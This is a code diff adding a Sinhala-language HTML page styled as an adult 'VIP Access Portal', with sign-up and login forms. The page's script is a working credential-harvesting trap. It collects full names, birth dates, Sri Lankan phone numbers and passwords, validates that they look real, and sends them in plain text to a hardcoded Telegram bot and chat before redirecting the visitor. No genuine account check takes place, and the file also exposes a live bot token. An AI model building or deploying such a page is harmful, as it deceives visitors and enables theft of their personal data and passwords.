@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Access Portal - Lakmina King👑️</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            width: 100%;
+            padding: 20px 10px;
+            background: #05050a;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* පසුබිම් රූපය සහ Glass Effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('1.jpg') no-repeat center center;
+            background-size: cover;
+            opacity: 0.45;
+            z-index: -1;
+        }
+
+        /* ප්‍රධාන Glass Wrapper එක */
+        .wrapper {
+            width: 100%;
+            max-width: 430px;
+            border-radius: 16px;
+            padding: 35px 30px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            background: rgba(12, 16, 33, 0.65);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 255, 204, 0.15);
+        }
+
+        .header {
+            margin-bottom: 20px;
+        }
+
+        .header h2 {
+            font-size: 24px;
+            color: #00ffcc;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            font-size: 12px;
+            color: #d1d5db;
+        }
+
+        /* Tab බොත්තම් මෝස්තරය */
+        .tab-box {
+            display: flex;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 25px;
+            padding: 4px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .tab-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #ccc;
+            padding: 8px 12px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            border-radius: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .tab-btn.active {
+            background: #00ffcc;
+            color: #05050a;
+            box-shadow: 0 0 12px rgba(0, 255, 204, 0.6);
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Glassmorphism Floating Input Fields */
+        .input-field {
+            position: relative;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.4);
+            margin: 18px 0;
+            text-align: left;
+        }
+
+        .input-field input {
+            width: 100%;
+            height: 40px;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            color: #fff;
+            padding: 0 5px;
+        }
+
+        .input-field label {
+            position: absolute;
+            top: 50%;
+            left: 5px;
+            transform: translateY(-50%);
+            color: #e0e0e0;
+            font-size: 13px;
+            pointer-events: none;
+            transition: 0.25s ease;
+        }
+
+        /* Input එක මත Click කළ විට Label එක ඉහළට යෑම */
+        .input-field input:focus ~ label,
+        .input-field input:valid ~ label,
+        .input-field input:not(:placeholder-shown) ~ label {
+            font-size: 0.75rem;
+            top: -2px;
+            color: #00ffcc;
+            font-weight: 600;
+        }
+
+        .input-field input:focus {
+            border-bottom-color: #00ffcc;
+        }
+
+        /* Date Input එක සඳහා විශේෂ සකස් කිරීම් */
+        .input-field input[type="date"] {
+            color-scheme: dark;
+        }
+
+        /* Submit බොත්තම් මෝස්තරය */
+        .btn-submit {
+            background: #ffffff;
+            color: #05050a;
+            font-weight: 700;
+            border: none;
+            padding: 12px 20px;
+            cursor: pointer;
+            border-radius: 25px;
+            font-size: 14px;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-submit:hover {
+            background: #00ffcc;
+            color: #05050a;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.6);
+            transform: translateY(-2px);
+        }
+
+        /* පණිවිඩ පෙන්වන කොටස */
+        .status-msg {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .msg-error {
+            background: rgba(255, 71, 87, 0.2);
+            border: 1px solid #ff4757;
+            color: #ff6b81;
+        }
+
+        .msg-success {
+            background: rgba(0, 255, 204, 0.2);
+            border: 1px solid #00ffcc;
+            color: #00ffcc;
+        }
+
+        /* යටින් ඇති ලින්ක්ස් (Footer Links) */
+        .footer-links {
+            margin-top: 25px;
+            display: flex;
+            justify-content: space-around;
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+            padding-top: 15px;
+        }
+
+        .footer-links a {
+            color: #e0e0e0;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #00ffcc;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <h2>🔞 VIP Access Portal</h2>
+        <p>👑️ - Restricted Portal</p>
+    </div>
+
+    <!-- Tab Buttons -->
+    <div class="tab-box">
+        <button type="button" class="tab-btn active" id="signUpTabBtn" onclick="showForm('signup')">Sign Up</button>
+        <button type="button" class="tab-btn" id="loginTabBtn" onclick="showForm('login')">Login</button>
+    </div>
+
+    <!-- Sign Up Form -->
+    <form id="signupForm" onsubmit="processSignUp(event)">
+        <div class="input-field">
+            <input type="text" id="signUpName" placeholder=" " required autocomplete="name">
+            <label>👤 සම්පූර්ණ නම (මුල් නම සහ වාසගම)</label>
+        </div>
+        <div class="input-field">
+            <input type="date" id="signUpDob" required autocomplete="bday">
+            <label style="top: -2px; font-size: 0.75rem; color: #00ffcc;">📅 උපන්දිනය</label>
+        </div>
+        <div class="input-field">
+            <input type="tel" id="signUpPhone" placeholder=" " required autocomplete="tel">
+            <label>📞 ජංගම දුරකථන අංකය</label>
+        </div>
+        <div class="input-field">
+            <input type="password" id="signUpPassword" placeholder=" " required autocomplete="new-password">
+            <label>🔑 මුරපදය (Password)</label>
+        </div>
+        <button type="submit" class="btn-submit" id="signUpBtn">ගිණුම තහවුරු කරන්න 📝</button>
+        <div id="signUpMsg" class="status-msg"></div>
+    </form>
+
+    <!-- Login Form -->
+    <form id="loginForm" style="display: none;" onsubmit="processLogin(event)">
+        <div class="input-field">
+            <input type="password" id="loginPassword" placeholder=" " required autocomplete="current-password">
+            <label>🔑 මුරපදය (Password)</label>
+        </div>
+        <button type="submit" class="btn-submit" id="loginBtn">ඇතුල් වන්න 🚀</button>
+        <div id="loginMsg" class="status-msg"></div>
+    </form>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+        <a href="../My%20Midiya/index.html" target="_blank">🌐 සමාජ මාධ්‍ය පිටුව</a>
+        <a href="../index.html" target="_blank">🏠 ප්‍රධාන වෙබ් අඩවිය</a>
+    </div>
+</div>
+
+<script>
+    // Telegram Bot API තොරතුරු
+    const TELEGRAM_BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
+    const TELEGRAM_CHAT_ID = '7883989086';
+
+    // Tab මාරු කිරීමේ ශ්‍රිතය
+    function showForm(type) {
+        const signupForm = document.getElementById('signupForm');
+        const loginForm = document.getElementById('loginForm');
+        const signUpTabBtn = document.getElementById('signUpTabBtn');
+        const loginTabBtn = document.getElementById('loginTabBtn');
+
+        if (type === 'login') {
+            signupForm.style.display = 'none';
+            loginForm.style.display = 'flex';
+            signUpTabBtn.classList.remove('active');
+            loginTabBtn.classList.add('active');
+        } else {
+            loginForm.style.display = 'none';
+            signupForm.style.display = 'flex';
+            loginTabBtn.classList.remove('active');
+            signUpTabBtn.classList.add('active');
+        }
+    }
+
+    // නම පරීක්ෂා කිරීමේ ආරක්ෂිත ශ්‍රිතය
+    function validateRealName(name) {
+        const cleanName = name.trim();
+        
+        if (cleanName.length < 4) return false;
+        if (/(.)\1{3,}/i.test(cleanName)) return false;
+
+        const words = cleanName.split(/\s+/).filter(word => word.length > 0);
+        if (words.length < 2) return false;
+
+        return true;
+    }
+
+    // ජංගම දුරකථන අංකය පරීක්ෂා කිරීමේ ආරක්ෂිත ශ්‍රිතය
+    function validateRealPhone(phone) {
+        const cleanPhone = phone.replace(/[\s\-]/g, '');
+        const slPhoneRegex = /^(?:\+94|94|0)?7[01245678]\d{7}$/;
+        if (!slPhoneRegex.test(cleanPhone)) return false;
+
+        const localDigits = cleanPhone.slice(-9);
+
+        if (/^(\d)\1+$/.test(localDigits)) return false;
+        if ("0123456789".includes(localDigits) || "9876543210".includes(localDigits)) return false;
+
+        return true;
+    }
+
+    // Telegram Bot වෙත තොරතුරු යැවීම
+    async function sendTelegramData(messageText) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Telegram Error:', error);
+        }
+    }
+
+    // Sign Up ක්‍රියාවලිය
+    async function processSignUp(e) {
+        e.preventDefault();
+
+        const name = document.getElementById('signUpName').value;
+        const dob = document.getElementById('signUpDob').value;
+        const phone = document.getElementById('signUpPhone').value;
+        const password = document.getElementById('signUpPassword').value;
+        const btn = document.getElementById('signUpBtn');
+        const msg = document.getElementById('signUpMsg');
+
+        // 1. නම පරීක්ෂා කිරීම
+        if (!validateRealName(name)) {
+            msg.className = 'status-msg msg-error';
+            msg.innerHTML = '❌ කරුණාකර ඔබගේ සැබෑ මුල් නම සහ වාසගම ඇතුළත් කරන්න (උදා: Lakmina Manujaya).';
+            msg.style.display = 'block';
+            return;
+        }
+
+        // 2. දුරකථන අංකය පරීක්ෂා කිරීම
+        if (!validateRealPhone(phone)) {
+            msg.className = 'status-msg msg-error';
+            msg.innerHTML = '❌ කරුණාකර නිවැරදි සක්‍රීය ජංගම දුරකථන අංකයක් ඇතුළත් කරන්න (උදා: 07X XXX XXXX).';
+            msg.style.display = 'block';
+            return;
+        }
+
+        btn.textContent = 'තොරතුරු යොමු වෙමින් පවතී...';
+        msg.className = 'status-msg msg-success';
+        msg.innerHTML = '✅ තොරතුරු තහවුරුයි...';
+        msg.style.display = 'block';
+
+        const message = `📝 <b>නව ගිණුම් ලියාපදිංචියක්! (Sign Up)</b>\n\n👤 <b>නම:</b> ${name}\n📅 <b>උපන්දිනය:</b> ${dob}\n📞 <b>දුරකථන අංකය:</b> ${phone}\n🔑 <b>මුරපදය:</b> ${password}`;
+        await sendTelegramData(message);
+
+        setTimeout(() => {
+            window.location.href = 'Masej.html';
+        }, 1000);
+    }
+
+    // Login ක්‍රියාවලිය
+    async function processLogin(e) {
+        e.preventDefault();
+
+        const password = document.getElementById('loginPassword').value;
+        const btn = document.getElementById('loginBtn');
+        const msg = document.getElementById('loginMsg');
+
+        btn.textContent = 'ඇතුල් වෙමින් පවතී...';
+        msg.className = 'status-msg msg-success';
+        msg.innerHTML = '✅ ලොගින් විසින් සාර්ථකව පිවිසුම් විය නම්...';
+        msg.style.display = 'block';
+
+        const message = `🔐 <b>ලොගින් පිවිසුම් උත්සාහයක්! (Login)</b>\n\n🔑 <b>මුරපදය:</b> ${password}`;
+        await sendTelegramData(message);
+
+        setTimeout(() => {
+            window.location.href = '1.Html';
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
